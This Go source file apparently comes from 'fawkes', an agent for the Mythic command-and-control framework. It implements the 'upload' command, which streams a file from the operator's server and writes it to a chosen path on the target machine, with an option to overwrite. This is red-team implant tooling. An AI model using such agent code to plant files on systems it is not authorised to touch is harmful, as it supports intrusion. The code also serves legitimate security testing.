package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// UploadCommand implements the upload command
type UploadCommand struct{}

// Name returns the command name
func (c *UploadCommand) Name() string {
	return "upload"
}

// Description returns the command description
func (c *UploadCommand) Description() string {
	return "Upload a file to the target system"
}

// UploadArgs represents the arguments for upload command
type UploadArgs struct {
	FileID     string `json:"file_id"`
	RemotePath string `json:"remote_path"`
	Overwrite  bool   `json:"overwrite"`
}

// Execute executes the upload command
func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
	args := UploadArgs{}
	
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse arguments: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Handle tilde expansion
	fixedFilePath := args.RemotePath
	if strings.HasPrefix(fixedFilePath, "~/") {
		dirname, _ := os.UserHomeDir()
		fixedFilePath = filepath.Join(dirname, fixedFilePath[2:])
	}
	fullPath, _ := filepath.Abs(fixedFilePath)

	// Check if file exists
	_, err = os.Stat(fullPath)
	fileExists := err == nil

	if fileExists && !args.Overwrite {
		return structs.CommandResult{
			Output:    fmt.Sprintf("File %s already exists. Use overwrite parameter to replace it.", fullPath),
			Status:    "error",
			Completed: true,
		}
	}

	// Create file
	var fp *os.File
	if fileExists && args.Overwrite {
		fp, err = os.OpenFile(fullPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	} else {
		fp, err = os.Create(fullPath)
	}
	
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to create file %s: %v", fullPath, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer fp.Close()

	// Request file from Mythic
	getFileRequest := structs.GetFileFromMythicStruct{
		FileID:                args.FileID,
		FullPath:              fullPath,
		Task:                  &task,
		SendUserStatusUpdates: true,
		ReceivedChunkChannel:  make(chan []byte),
	}
	
	task.Job.GetFileFromMythic <- getFileRequest

	totalBytesWritten := 0
	for {
		newBytes := <-getFileRequest.ReceivedChunkChannel
		if len(newBytes) == 0 {
			break
		}
		fp.Write(newBytes)
		totalBytesWritten += len(newBytes)
	}

	if task.DidStop() {
		return structs.CommandResult{
			Output:    "Upload stopped by user",
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Uploaded %d bytes to %s", totalBytesWritten, fullPath),
		Status:    "success",
		Completed: true,
	}
}
